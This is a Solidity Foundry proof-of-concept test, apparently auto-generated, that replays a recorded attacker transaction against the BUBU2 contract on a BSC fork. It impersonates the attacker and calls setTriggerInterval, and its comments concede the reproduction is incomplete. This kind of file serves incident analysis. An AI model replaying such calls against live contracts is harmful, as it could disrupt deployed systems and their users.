// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x6ecef2e7b255a25feb92c9254c73e6c370e949a7
// Attack Contract : 0x3ff3f18b5c113fac5e81b43f80bf438b99edee52
// Vulnerable Contract : 0x3ff3f18b5c113fac5e81b43f80bf438b99edee52
// Attack Tx : 0x1bc0a65cb33a839d44425016b11ed51e325997afe61c5bb6cc4bbe93a330141c
// Block : 83896145
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : unpriced_reproduction
// Reproduced Value : N/A
//
// @POC Author
// Generated PoC

contract PoCTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant BUBU2 = Addresses.BUBU2;
    uint256 constant TRIGGER_INTERVAL = 120;
    uint256 constant TX_TIMESTAMP = 1772299298;
    uint256 constant TX_BLOCK_NUMBER = 83896145;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        _prepareProfit(BUBU2, address(0));

        // Structured gap: action_0000 is a trace-observed storage write, but
        // action_graph_validation reports it as missing a semantic action match.
        // The PoC therefore preserves the normal public entry call; it does not
        // emulate the write.
        IBUBU2(BUBU2).setTriggerInterval(TRIGGER_INTERVAL);

        vm.stopPrank();
        _assertProfit();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        return;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant BUBU2 = 0x3fF3f18b5C113fAC5E81b43f80Bf438B99EdEE52;
    address internal constant attacker_eoa = 0x6EcEF2e7b255a25fEB92c9254c73E6c370e949a7;
}

interface IBUBU2 {
    function setTriggerInterval(uint256) external payable;
}
